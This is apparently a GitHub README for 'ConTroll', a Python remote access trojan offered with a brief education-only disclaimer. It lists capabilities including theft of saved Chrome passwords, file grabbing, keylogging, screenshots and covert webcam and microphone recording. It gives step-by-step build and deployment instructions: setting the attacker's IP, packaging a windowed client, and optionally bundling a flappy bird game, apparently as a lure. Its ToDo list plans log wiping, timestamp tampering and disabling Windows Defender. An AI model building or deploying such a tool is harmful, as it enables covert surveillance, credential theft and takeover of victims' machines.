# DISCLAIMER

#### ConTroll is for education/research purposes only. The author takes NO responsibility and/or liability for how you choose to use any of the tools/source code/any files provided. The author and anyone affiliated with will not be liable for any losses and/or damages in connection with the use of ANY files provided with ConTroll.  By using ConTroll or any files included, you understand that you are AGREEING TO USE AT YOUR OWN RISK. 

#### Once again ConTroll and ALL files included are for EDUCATION and/or RESEARCH purposes ONLY. ConTroll is ONLY intended to be used on your own pentesting labs, or with explicit consent from the owner of the property being tested.

# ConTroll - Remote Access Trojan (RAT)
**![Watch Presentation Video Here](https://www.youtube.com/watch?v=pHmgPY3jDHQ&lc=Ugz4ri2cnHnICznIVUx4AaABAg)**
Created a remote access trojan that will establish administrative control over any machine it compromises.

![alt text](img/1.PNG)

# Features

1. Lock Victim's screen.
2. Auto-reconnect to Server.
3. Create a custom popup box.
4. Grab files from the victim's machine.
5. Get information about victim's machine.
6. Steal saved passwords stored in chrome.
7. Activate a system’s webcam and record video.
8. Activate system microphone and record audio.
9. Kill any process running on victim's machine.
10. Monitoring user behavior through keylogger capabilities (Keystrokes and Screenshots).

# Requirements
**You NEED a 32bit OS architecture to build the binaries. So use a win 32 or unix 32 system to run and build the code**
1. python 2.x
2. opencv
3. numpy
4. pyhook
5. pythoncom
6. pyinstaller
7. pygame
8. py2exe

# Usage
1. Clone the repo
```
git clone https://github.com/Lithium95/ConTroll_Remote_Access_Trojan.git
```

2. Install opencv and numpy from requirements.txt
```
python -m pip install -r requirements.txt
```
3. install pyHook download link
http://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/

4. Install pythoncom download link
http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/

5. Set ip_address and port in client.pyw and server.py. The ip_address should be the attacker's IP address.

6. Use pyinstaller to build the client binary
```
python pyinstaller.py --onefile --windowed client.pyw
```
**Skip the next 2 steps if you dont want to use the flappy bird game**

7. Setup a local server to host the client.exe. Use live-server: https://github.com/tapio/live-server

8. Use py2exe to build the flappy bird game
```
python setup.py
```
The exe for the flappy bird game will be in a folder called 'dist'

9. Run the server
```
python server.py
```

10. Wait for the client to connect

# ToDo

1. Clear the System, Security, and Application logs
2. Encrypt communication between server and client
3. Edit the accessed, created, and modified properties of files
4. Enable/Disable services such as RDP,UAC, and Windows Defender
